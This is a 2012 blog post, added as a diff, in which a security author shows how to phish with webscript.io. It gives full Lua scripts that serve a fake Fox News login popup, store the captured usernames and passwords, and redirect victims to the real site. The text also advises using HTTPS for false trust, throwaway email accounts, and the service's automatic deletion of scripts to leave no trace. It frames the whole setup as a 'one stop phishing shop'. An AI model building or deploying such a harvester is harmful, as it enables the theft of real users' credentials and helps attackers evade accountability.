@@ -1,0 +1,67 @@
+---
+layout: post
+title: Phishing with Webscript.io
+date: 2012-11-05 14:43:48.000000000 -05:00
+type: post
+published: true
+status: publish
+categories:
+- Code
+- Just For Fun
+- Pentest
+- Social Engineering
+tags: []
+meta:
+  _edit_last: '20119316'
+  _publicize_pending: '1'
+  _wpas_done_648455: '1'
+  publicize_twitter_user: averagesecguy
+  _wpas_done_648456: '1'
+  _publicize_done_external: a:1:{s:7:"twitter";a:1:{i:244128388;b:1;}}
+author:
+  login: averagesecurityguy
+  email: stephen@averagesecurityguy.info
+  display_name: averagesecurityguy
+  first_name: ''
+  last_name: ''
+---
+<p>One of the guys on the <a href="http://chugalug.org" title="Chattanooga Unix, GNU and Linux Users Group" target="_blank">Chugalug</a> mailing list mentioned <a href="http://webscript.io" title="Webscript.io" target="_blank">webscript.io</a> on Saturday night and it immediately sounded interesting. The basic concept is you choose a webscript.io subdomain, write a few Lua scripts and you have a web service up and running. The web service can run under HTTP or HTTPS. One of the other guys on the list was equally impressed but wondered what would you do with it. My first thought was phishing. So, I reworked a phishing setup I did a while back and made it work for webscript.io.</p>
+<p>I setup an account with webscript.io, you only need an email address to do this, and created two scripts.</p>
+<h4>foxnews.webscript.io/login</h4>
+<pre>
+return [[
+
+&lt;!-- Add the background to give the popup effect --&gt;
+&lt;div id="bg" style="background-color: #111111; opacity: 0.65; 
+filter: alpha(opacity=65); position: absolute; z-index: 9000; 
+top: 0px; left: 0px; width: 100%; height: 2000px;"&gt;&lt;/div&gt;
+
+&lt;!-- Create the login box --&gt;
+&lt;div id="login" style="padding: 16px; position: absolute; 
+top: 40px; left: 40px; background-color: #eeeeee; width: 300px; 
+z-index: 10000; text-align: left; border: 2px solid #000000;"&gt;
+&lt;p&gt;Login to the Fox News web site.&lt;/p&gt;
+
+&lt;form action="http://foxnews.webscript.io/data" method="POST"&gt;
+&lt;table border="0" cellpadding="1" cellspacing="1"&gt;
+
+&lt;tr&gt;&lt;td&gt;Username: &lt;/td&gt;
+&lt;td&gt;&lt;input type="text" name="username" /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;Password: &lt;/td&gt;
+&lt;td&gt;&lt;input type="password" name="password" /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td colspan="2"&gt;
+&lt;input type="submit" value="Login" /&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;/form&gt;
+&lt;/div&gt;]], {["Content-Type"]="text/html"}
+</pre>
+<h4>foxnews.webscript.io/data</h4>
+<pre>
+storage[request.form.username] = request.form.password 
+return 302, '', {
+	Location ='http://www.foxnews.com'
+}
+</pre>
+<p>The first script builds a page with a iframe and a "popup" login box. You can modify the HTML to use any target site that allows itself to be framed or you could use a screenshot of the target as a background. When the username and password are submitted webscript.io stores it for you and displays it on your management page when you log in.</p>
+<p>One problem with using webscript.io is you can't choose your own domain name, but truthfully, phishing victims are not know for paying attention to details. You can also mitigate this problem by using HTTPS, because most users don't think past getting the green "secure" web site indicator.</p>
+<p>One big benefit is that webscript.io automatically deletes your scripts after 7 days. So, you could setup an account with a throw-away email address, run your campaign, and walk away. Webscript.io will clean it all up for you. Also, looking through the examples it looks like you can send emails through them as well. It's a one stop phishing shop. :)</p>
